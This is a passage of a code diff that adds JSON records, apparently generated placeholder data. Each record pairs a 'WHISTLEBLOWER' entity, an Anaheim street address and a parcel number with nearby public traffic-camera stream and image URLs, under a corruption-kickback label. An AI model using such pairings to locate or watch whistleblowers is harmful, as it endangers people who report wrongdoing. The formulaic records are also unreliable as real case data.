+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #5 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0558",
+      "entity_name": "WHISTLEBLOWER 006",
+      "address": "1006 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-06",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #6 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0559",
+      "entity_name": "WHISTLEBLOWER 007",
+      "address": "1007 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-07",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #7 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0560",
+      "entity_name": "WHISTLEBLOWER 008",
+      "address": "1008 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-08",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #8 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0561",
+      "entity_name": "WHISTLEBLOWER 009",
+      "address": "1009 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
+      "apn": "178-431-09",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #9 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0562",
+      "entity_name": "WHISTLEBLOWER 010",
+      "address": "1010 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-10",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #10 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0563",
+      "entity_name": "WHISTLEBLOWER 011",
+      "address": "1011 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-11",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #11 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0564",
+      "entity_name": "WHISTLEBLOWER 012",
+      "address": "1012 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-12",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #12 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0565",
+      "entity_name": "WHISTLEBLOWER 013",
+      "address": "1013 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-13",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #13 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0566",
+      "entity_name": "WHISTLEBLOWER 014",
+      "address": "1014 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-14",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #14 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0567",
+      "entity_name": "WHISTLEBLOWER 015",
+      "address": "1015 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-15",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #15 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0568",
+      "entity_name": "WHISTLEBLOWER 016",
+      "address": "1016 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-16",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #16 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0569",
+      "entity_name": "WHISTLEBLOWER 017",
+      "address": "1017 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-17",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #17 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0570",
+      "entity_name": "WHISTLEBLOWER 018",
+      "address": "1018 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-18",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #18 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0571",
+      "entity_name": "WHISTLEBLOWER 019",
+      "address": "1019 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
+      "apn": "178-431-19",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #19 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0572",
+      "entity_name": "WHISTLEBLOWER 020",
+      "address": "1020 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-20",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #20 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0573",
+      "entity_name": "WHISTLEBLOWER 021",
+      "address": "1021 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-21",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #21 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0574",
+      "entity_name": "WHISTLEBLOWER 022",
+      "address": "1022 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-22",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #22 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0575",
+      "entity_name": "WHISTLEBLOWER 023",
+      "address": "1023 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-23",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
